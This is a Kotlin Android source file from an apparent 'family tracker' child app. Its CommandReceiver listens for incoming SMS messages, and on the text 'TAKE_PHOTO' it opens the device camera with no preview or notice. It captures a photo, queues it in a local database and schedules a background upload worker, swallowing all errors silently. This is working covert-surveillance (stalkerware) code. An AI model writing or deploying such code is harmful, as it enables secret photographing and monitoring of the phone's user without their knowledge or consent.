package com.family.tracker.child

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.telephony.SmsMessage
import android.util.Size
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File

class CommandReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        try {
            val pdus = intent.extras?.get("pdus") as? Array<*> ?: return
            for (pdu in pdus) {
                val msg = SmsMessage.createFromPdu(pdu as ByteArray)
                val cmd = String(msg.userData ?: continue).trim()
                if (cmd == "TAKE_PHOTO") {
                    takePhotoSilently(context)
                }
            }
        } catch (e: Exception) {}
    }

    private fun takePhotoSilently(context: Context) {
        val cm = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            val camId = cm.cameraIdList.firstOrNull { it == "0" } ?: return
            val chars = cm.getCameraCharacteristics(camId)
            val size = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
                ?.getOutputSizes(ImageReader::class.java)?.firstOrNull { it.width <= 1280 } ?: Size(640, 480)
            
            val reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
            val file = File(context.cacheDir, "photo_${System.currentTimeMillis()}.jpg")

            reader.setOnImageAvailableListener({ r ->
                val img = r.acquireLatestImage()
                if (img != null) {
                    val buf = img.planes[0].buffer
                    val bytes = ByteArray(buf.remaining())
                    buf.get(bytes)
                    file.writeBytes(bytes)
                    img.close()
                    savePhotoToQueue(context, file.absolutePath)
                    WorkManager.getInstance(context).enqueue(OneTimeWorkRequestBuilder<PhotoUploaderWorker>().build())
                }
            }, null)

            cm.openCamera(camId, object : CameraDevice.StateCallback() {
                override fun onOpened(cam: CameraDevice) {
                    val surface = reader.surface
                    cam.createCaptureSession(listOf(surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(sess: CameraCaptureSession) {
                            val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                            req.addTarget(surface)
                            sess.capture(req.build(), null, null)
                            cam.close()
                        }
                        override fun onConfigureFailed(sess: CameraCaptureSession) {}
                    }, null)
                }
                override fun onDisconnected(cam: CameraDevice) {}
                override fun onError(cam: CameraDevice, e: Int) {}
            }, null)
        } catch (e: CameraAccessException) {}
    }

    private fun savePhotoToQueue(context: Context, path: String) {
        val photo = PendingPhoto(photoPath = path, timestamp = System.currentTimeMillis())
        CoroutineScope(Dispatchers.IO).launch {
            DbProvider.get(context).photoDao().addPhoto(photo)
        }
    }
}
